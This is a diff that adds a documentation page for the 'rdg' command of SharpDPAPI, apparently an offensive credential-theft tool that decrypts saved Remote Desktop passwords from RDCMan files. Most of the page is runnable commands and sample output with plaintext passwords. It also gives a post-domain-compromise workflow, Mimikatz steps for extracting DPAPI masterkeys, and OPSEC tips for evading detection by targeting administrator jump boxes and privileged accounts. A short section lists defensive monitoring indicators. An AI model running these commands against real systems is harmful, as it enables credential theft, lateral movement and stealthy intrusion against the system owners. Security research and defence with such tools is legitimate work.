@@ -1,0 +1,465 @@
+---
+title: 'rdg'
+description: 'Decrypt Remote Desktop Connection Manager passwords'
+icon: 'server'
+---
+
+## Overview
+
+The **rdg** command searches for and decrypts saved RDP passwords from RDCMan.settings files and .rdg/.RDC files. These files contain Remote Desktop connection profiles with saved credentials for administrators managing multiple systems.
+
+<Info>
+  RDCMan (Remote Desktop Connection Manager) is a popular tool for managing multiple RDP connections. The rdg command can decrypt both the settings file and individual .rdg group files.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt with CryptUnprotectData (unprivileged)
+SharpDPAPI.exe rdg /unprotect
+
+# Decrypt with domain backup key
+SharpDPAPI.exe rdg /pvk:key.pvk
+
+# Decrypt with masterkey mappings
+SharpDPAPI.exe rdg {GUID1}:SHA1 {GUID2}:SHA1
+
+# Target specific RDG file
+SharpDPAPI.exe rdg /target:C:\Users\admin\Documents\servers.rdg /unprotect
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="CryptUnprotectData">
+    ```bash
+    # Use Windows API for decryption (unprivileged)
+    SharpDPAPI.exe rdg /unprotect
+    ```
+
+    <Tip>
+      This method works **without** needing masterkeys if run from the user context who saved the passwords. No LSASS access required!
+    </Tip>
+  </Tab>
+
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe rdg /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe rdg /pvk:key.pvk
+    ```
+
+    First decrypts user masterkeys, then uses them to decrypt RDP passwords.
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe rdg {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe rdg /mkfile:masterkeys.txt
+    ```
+
+    Directly uses pre-decrypted masterkeys for password decryption.
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe rdg /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe rdg /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe rdg /credkey:abc123...
+    ```
+
+    Decrypts user masterkeys first, then RDP passwords.
+  </Tab>
+
+  <Tab title="RPC Decryption">
+    ```bash
+    # Decrypt via domain controller
+    SharpDPAPI.exe rdg /rpc
+    ```
+
+    Asks domain controller to decrypt masterkeys remotely.
+  </Tab>
+</Tabs>
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FILE` | Target specific RDCMan.settings, .rdg, or .RDC file |
+| `/target:FOLDER` | Target folder containing .rdg files |
+| `/server:SERVER` | Triage remote server (requires admin access + pvk/password) |
+
+<Warning>
+  When using `/target` with a file, you must provide either `/unprotect` or {GUID}:SHA1 masterkey mappings. When using `/target` with a folder, the folder must contain DPAPI masterkeys if using `/pvk`.
+</Warning>
+
+## What Gets Decrypted
+
+The rdg command decrypts passwords from:
+
+<Steps>
+  <Step title="RDCMan.settings File">
+    Located at: `%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`
+
+    Contains:
+    - Credential profiles
+    - Default logon credentials
+    - Recent server connections
+  </Step>
+
+  <Step title="Referenced .rdg Files">
+    Group files referenced by RDCMan.settings
+
+    Contains:
+    - Individual server entries
+    - Per-server credentials
+    - Connection settings
+  </Step>
+</Steps>
+
+## Execution Context
+
+<Tabs>
+  <Tab title="Elevated">
+    When run with administrative privileges:
+    - Triages **all users** on the system
+    - Accesses RDCMan files in all user profiles
+    - Decrypts all RDP credential profiles
+  </Tab>
+
+  <Tab title="Unelevated">
+    When run without elevation:
+    - Only triages **current user**
+    - Can use `/unprotect` without masterkeys
+    - Most OPSEC-friendly approach
+  </Tab>
+</Tabs>
+
+## Example: Using /unprotect
+
+```bash
+SharpDPAPI.exe rdg /unprotect
+```
+
+**Output:**
+```
+[*] Action: RDG Triage
+
+[*] Using CryptUnprotectData() to decrypt RDG passwords
+
+[*] Triaging RDCMan Settings Files for current user
+
+    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+    Accessed      : 5/9/2019 11:52:58 AM
+    Modified      : 5/9/2019 11:52:58 AM
+    Recent Server : test\primary.testlab.local
+
+        Cred Profiles
+
+          Profile Name : testprofile
+            UserName   : testlab.local\dfm
+            Password   : Password123!
+
+        Default Logon Credentials
+
+          Profile Name : Custom
+            UserName   : TESTLAB\harmj0y
+            Password   : Password123!
+
+      C:\Users\harmj0y\Documents\test.rdg
+
+        Servers
+
+          Name         : secondary.testlab.local
+
+          Name         : primary.testlab.local
+          Profile Name : Custom
+            UserName   : TESTLAB\dfm.a
+            Password   : Password123!
+```
+
+<Tip>
+  The `/unprotect` method is preferred when possible - it's unprivileged, doesn't require masterkeys, and doesn't touch LSASS.
+</Tip>
+
+## Example: Using Masterkey Mappings
+
+```bash
+SharpDPAPI.exe rdg {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017
+```
+
+**Output:**
+```
+[*] Action: RDG Triage
+
+[*] Using CryptUnprotectData() to decrypt RDG passwords
+
+[*] Triaging RDCMan Settings Files for current user
+
+    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+    Accessed      : 5/9/2019 11:52:58 AM
+    Modified      : 5/9/2019 11:52:58 AM
+    Recent Server : test\primary.testlab.local
+
+        Cred Profiles
+
+          Profile Name : testprofile
+            UserName   : testlab.local\dfm
+            Password   : Password123!
+
+        Default Logon Credentials
+
+          Profile Name : Custom
+            UserName   : TESTLAB\harmj0y
+            Password   : Password123!
+
+      C:\Users\harmj0y\Documents\test.rdg
+
+        Servers
+
+          Name         : secondary.testlab.local
+
+          Name         : primary.testlab.local
+          Profile Name : Custom
+            UserName   : TESTLAB\dfm.a
+            Password   : Password123!
+```
+
+## Example: Using Domain Backup Key
+
+```bash
+SharpDPAPI.exe rdg /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+```
+
+**Output:**
+```
+[*] Action: RDG Triage
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+
+[*] Triaging RDCMan.settings Files for ALL users
+
+    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+    Accessed      : 5/9/2019 11:52:58 AM
+    Modified      : 5/9/2019 11:52:58 AM
+    Recent Server : test\primary.testlab.local
+
+        Cred Profiles
+
+          Profile Name : testprofile
+            UserName   : testlab.local\dfm.a
+            Password   : Password123!
+
+        Default Logon Credentials
+
+          Profile Name : Custom
+            UserName   : TESTLAB\harmj0y
+            Password   : Password123!
+
+      C:\Users\harmj0y\Documents\test.rdg
+
+        Servers
+
+          Name         : secondary.testlab.local
+
+          Name         : primary.testlab.local
+          Profile Name : Custom
+            UserName   : TESTLAB\dfm.a
+            Password   : Password123!
+```
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Unprivileged Execution (Recommended)">
+    Run as the target user without elevation:
+
+    ```bash
+    # No masterkeys or elevation needed
+    SharpDPAPI.exe rdg /unprotect
+
+    # Target specific file
+    SharpDPAPI.exe rdg /target:C:\Users\admin\Documents\production.rdg /unprotect
+    ```
+
+    **Benefits:**
+    - No LSASS access required
+    - No elevation needed
+    - Minimal detection footprint
+    - Works from user context
+  </Accordion>
+
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain admin and backup key:
+
+    ```bash
+    # 1. Retrieve backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Decrypt RDG files locally
+    SharpDPAPI.exe rdg /pvk:key.pvk
+
+    # 3. Decrypt RDG files on remote systems
+    SharpDPAPI.exe rdg /pvk:key.pvk /server:admin-workstation.domain.com
+    SharpDPAPI.exe rdg /pvk:key.pvk /server:jumpbox.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Using Mimikatz-Extracted Masterkeys">
+    Extract masterkeys and decrypt RDG files:
+
+    ```bash
+    # 1. In Mimikatz
+    # mimikatz# privilege::debug
+    # mimikatz# sekurlsa::dpapi
+
+    # 2. Run SharpDPAPI with extracted masterkeys
+    SharpDPAPI.exe rdg {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd...
+    ```
+  </Accordion>
+
+  <Accordion title="Offline/Forensic Analysis">
+    Analyzing copied RDG files:
+
+    ```bash
+    # Target specific RDG file with backup key
+    SharpDPAPI.exe rdg /target:C:\Evidence\servers.rdg /pvk:key.pvk
+
+    # Target folder of RDG files with masterkeys
+    SharpDPAPI.exe rdg /target:C:\Evidence\RDG\ {GUID}:SHA1
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## RDCMan File Locations
+
+**Settings File:**
+```
+%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+```
+
+**Group Files (.rdg):**
+- Typically stored in user's Documents folder
+- Can be anywhere on the file system
+- Referenced paths shown in RDCMan.settings output
+
+**Individual Connection Files (.RDC):**
+- Standard RDP connection files
+- Can contain saved credentials
+- Found in various user locations
+
+## Why Use /unprotect?
+
+The `/unprotect` flag uses **CryptUnprotectData()** instead of manual masterkey decryption:
+
+<CardGroup cols={2}>
+  <Card title="No Masterkeys" icon="key-skeleton">
+    Doesn't require extracting or providing masterkeys
+  </Card>
+  <Card title="Unprivileged" icon="user">
+    Works without elevation or admin rights
+  </Card>
+  <Card title="No LSASS" icon="shield-check">
+    Doesn't need to access LSASS process
+  </Card>
+  <Card title="Stealth" icon="user-secret">
+    Minimal detection footprint
+  </Card>
+</CardGroup>
+
+<Note>
+  This approach isn't used for credentials/vaults because of how Windows Credential Manager protects data. See [Benjamin's documentation](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem) for details.
+</Note>
+
+## Detection Considerations
+
+**Host-Based Indicators:**
+- Reading RDCMan.settings file
+- Access to .rdg files in user directories
+- Non-standard processes accessing RDP credential files
+- Bulk enumeration of RDCMan files
+
+**Defensive Monitoring:**
+- Monitor access to `%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\`
+- Alert on RDCMan.settings file access by non-RDCMan processes
+- Track .rdg file access patterns
+- Detect bulk RDP credential file enumeration
+- Monitor for LSASS access (when not using /unprotect)
+
+**Event Log Indicators:**
+```
+Event ID: 4663 (File Access)
+Object Name: *\Remote Desktop Connection Manager\RDCMan.settings
+Object Name: *.rdg
+Object Name: *.RDC
+```
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt Credential Manager RDP credentials
+  </Card>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Comprehensive user DPAPI triage
+  </Card>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Best Practices">
+  - Prefer `/unprotect` when running as the target user
+  - Look for RDCMan on administrator workstations and jump boxes
+  - Check both RDCMan.settings and referenced .rdg files
+  - Correlate server names with network infrastructure
+  - Look for privileged account credentials (domain admins, service accounts)
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Use `/unprotect` for minimal detection footprint
+  - Run without elevation when possible
+  - Target specific files instead of bulk enumeration
+  - Redirect output to file with `/consoleoutfile`
+  - Avoid using `/pvk` if `/unprotect` will work
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No RDCMan files found:**
+  - User may not use RDCMan (check for .rdg files manually)
+  - Files may be stored in non-standard locations
+  - Look for .RDC files as alternative
+  - Check Documents folder for .rdg files
+
+  **Decryption fails with /unprotect:**
+  - Must run from the user context who saved passwords
+  - Try using masterkeys or backup key instead
+  - Verify you're running as the correct user
+  - File may be corrupted or invalid format
+
+  **Partial decryption:**
+  - Different credential profiles may use different masterkeys
+  - Try using domain backup key for complete coverage
+  - Extract additional masterkeys with Mimikatz
+</Accordion>
